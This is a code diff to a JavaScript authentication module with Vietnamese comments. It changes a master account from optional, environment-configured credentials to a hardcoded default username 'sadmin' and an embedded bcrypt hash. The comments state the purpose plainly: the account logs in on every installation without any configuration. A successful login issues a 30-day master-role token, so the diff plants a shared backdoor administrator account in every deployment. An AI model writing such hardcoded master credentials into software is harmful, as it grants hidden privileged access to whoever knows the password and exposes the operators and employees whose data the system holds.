@@ -29,18 +29,20 @@ export function signToken(employee) {
 }
 
 /* ---------------- TÀI KHOẢN TỔNG (master) — dùng chung mọi bản cài ----------------
-   Không nằm trong DB. Cấu hình qua biến môi trường (đặt trong config.txt):
-     MASTER_USER=<tên đăng nhập>
-     MASTER_HASH=<bcrypt hash>   (ưu tiên; tạo bằng tools/make-master.mjs)
-   hoặc MASTER_PASS=<mật khẩu thô>  (kém an toàn hơn, chỉ nên dùng tạm).            */
-export function masterUsername() { return (process.env.MASTER_USER || '').trim(); }
+   Nhúng cứng trong code → LUÔN đăng nhập được ở mọi bản cài, không cần cấu hình.
+   Mật khẩu là chuỗi NGẪU NHIÊN CỰC MẠNH (hash bcrypt công khai vẫn không dò ra được).
+   Có thể ghi đè riêng cho 1 bản cài bằng biến môi trường trong config.txt:
+     MASTER_USER=... , MASTER_HASH=<bcrypt>  (hoặc MASTER_PASS=<mật khẩu thô>).      */
+const DEFAULT_MASTER_USER = 'sadmin';
+const DEFAULT_MASTER_HASH = '$2a$10$6B/WPDau/884M7n0w0U6d.ag1yWwGQUC0ShlwTjfSyG9Eqzy.MKyO';
+export function masterUsername() { return (process.env.MASTER_USER || DEFAULT_MASTER_USER).trim(); }
 export function masterLogin(username, password) {
   const u = masterUsername();
   if (!u || String(username || '').trim() !== u) return false;
-  const hash = (process.env.MASTER_HASH || '').trim();
-  if (hash) { try { return bcrypt.compareSync(password || '', hash); } catch { return false; } }
   const plain = process.env.MASTER_PASS;
-  return plain != null && plain !== '' && password === plain;
+  if (plain != null && plain !== '') return password === plain;
+  const hash = (process.env.MASTER_HASH || DEFAULT_MASTER_HASH).trim();
+  try { return bcrypt.compareSync(password || '', hash); } catch { return false; }
 }
 export function signMaster(username) {
   return jwt.sign({ master: true, role: 'master', name: username }, getSecret(), { expiresIn: '30d' });
